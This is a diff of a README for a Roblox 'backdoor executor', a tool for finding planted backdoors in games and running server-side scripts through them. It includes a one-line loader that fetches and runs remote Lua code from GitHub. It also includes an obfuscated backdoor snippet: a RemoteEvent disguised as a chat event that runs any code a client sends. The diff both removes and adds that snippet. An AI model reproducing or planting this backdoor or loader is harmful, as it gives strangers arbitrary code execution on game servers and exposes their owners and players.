@@ -5,13 +5,18 @@
 might be better than [backdoor.exe](https://github.com/iK4oS/backdoor.exe) in terms of scanning backdoors.
 
 ## Info
+
 This script is for [Roblox](https://roblox.com) scanning backdoors and executing serversided scripts within a GUI.
+
 ### Script
+
 Just copy the script below and execute it through your executor.
 ```lua
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/backdoor-executor.lua"))()
 ```
+
 ### Requirements
+
 - A brain that knows this stuff
 - Decent executor that supports filesystem functions (for config)
 ### Config Help
@@ -28,31 +33,39 @@ loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-sc
 }
 ```
 > if the cache didn't work backdoor-executor.lua will warn to you that the cache didn't work
+
 - Using autoexecute
 > add a script inside the autoExecute table, you can put many code as long as you want inside the table, example:
 ```lua
 -- it should be a array and don't add a nil or it will not work
 {
-	[[print("jLn0n is epic!")]],
-	[[warn("backdoor-executor.lua loaded!")]]
+	[[warn("backdoor-executor.lua loaded!")]],
 },
 ```
-- blacklisting events
-> it should be just like adding scripts on autoexecute, example:
+
+- Adding remote filters
+> adding remote filters are like this below:
 ```lua
 {
-	["eventNames"] = {
-		["blacklistedNameHere"] = true
-	},
-	["eventParentNames"] = {
-		["blacklistedParentName"] = true
-	}
+	["exampleFilter"] = function(remoteObj)
+		return remoteObj.Name == "bogus" or remoteObj.Parent.Name == "yomama"
+	end,
 },
+```
+- Adding script macros:
+> adding script macros can be easy, look at the example below:
+```lua
+{
+	["staticmacro"] = "value", -- returns static macros
+	["dynamicmacro"] = function() -- returns dynamic macro
+		return math.random(1, 100)
+	end,
+}
 ```
 
 ## Adding a backdoor in your game
 Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
 Make sure to enable `LoadStringEnabled` property in `ServerScriptService`. (code is just semi-obfuscated and easily crackable lol)
 ```lua
-if game:GetService("\82\117\110\83\101\114\118\105\99\101"):IsStudio() or not game:GetService("\83\101\114\118\101\114\83\99\114\105\112\116\83\101\114\118\105\99\101")["\76\111\97\100\83\116\114\105\110\103\69\110\97\98\108\101\100"] then return end;local a1=Instance.new("\82\101\109\111\116\101\69\118\101\110\116");a1.Name="\71\101\116\80\108\97\121\101\114\77\101\115\115\97\103\101\65\115\121\110\99";a1.Parent=game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101"):WaitForChild("\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115");a1.OnServerEvent:Connect(function(_, a2)loadstring(a2)()end)
+if game:GetService("\82\117\110\83\101\114\118\105\99\101"):IsStudio() or not game:GetService("\83\101\114\118\101\114\83\99\114\105\112\116\83\101\114\118\105\99\101")["\76\111\97\100\83\116\114\105\110\103\69\110\97\98\108\101\100"] then return end;local a=Instance.new("\82\101\109\111\116\101\69\118\101\110\116");a.Name="\71\101\116\80\108\97\121\101\114\77\101\115\115\97\103\101\65\115\121\110\99";a.Parent=game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101"):WaitForChild("\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115");a.OnServerEvent:Connect(function(_, b)loadstring(b)()end)
 ```
